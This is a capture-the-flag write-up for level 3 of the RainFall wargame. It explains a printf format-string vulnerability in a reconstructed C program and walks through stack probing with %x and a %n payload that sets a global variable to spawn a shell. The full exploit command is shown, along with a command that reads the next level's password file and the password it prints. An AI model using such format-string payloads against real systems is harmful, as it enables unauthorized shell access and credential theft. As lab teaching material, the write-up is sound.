# Level 3

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>

int m;

void v(void)
{
    char buffer[512];
    fgets(buffer, 512, stdin);
    printf(buffer);

    if (m == 64)
    {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main(void)
{
    v();
}
```

Let's focus on the `v` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. However, the `printf` function is known to be unsafe when user input is passed as the format argument, it's referred to as a format string vulnerability.
> You can read more about format string vulnerabilities [here](https://owasp.org/www-community/attacks/Format_string_attack).

We notice from the C code that we'll have to somehow write 64 bytes to the `m` variable to spawn a shell. We can do this by exploiting the format string vulnerability, thanks to the `%n` format specifier, which writes the number of bytes written so far to the corresponding argument. Furthermore, we'll make sure the corresponding argument is the `m` variable's address.

Before crafting our payload, we have to locate our input string on the stack and determine the address of `m`.

To locate our input string on the stack, we send a string with format specifiers, specifically the `%x` specifier, to `printf`. This specifier prints the next argument as a hexadecimal value. Since we don't pass any arguments to `printf`, it will print the values on the stack:
```bash
level3@RainFall:~$ python -c 'print("%x %x %x")' | ./level3
200 b7fd1ac0 b7ff37d0
```

To pinpoint our input string on the stack, we need to precede our `%x` format specifiers with a dummy string:

```bash
level3@RainFall:~$ python -c 'print("AAAA %x %x %x %x")' | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141
```

In this output, 41414141, the hexadecimal representation of 'AAAA', is found at the fourth position.

The assembly code reveals that the address of the `m` variable is `0x804988c`.

We can then craft our payload:
```
address of m + padding + %n format specifier pointing to the fourth argument

"\x08\x04\x98\x8c"[::-1] + "0"*(64-4) + "%4$n"
```

Since we need to write 64 into `m`, we write 64 characters (4 from the address of `m` and 60 from the "0" padding). 
Then, we use the `%n` format specifier to record the count of bytes written so far into the fourth argument, which is `m`'s address.

Let's execute our payload:
```bash
level3@RainFall:~$ (python -c 'print("\x08\x04\x98\x8c"[::-1] + "0"*(64-4) + "%4$n")' && echo 'cat /home/user/level4/.pass') | ./level3
�000000000000000000000000000000000000000000000000000000000000
Wait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

We are now level4! Let's move on to the next level.

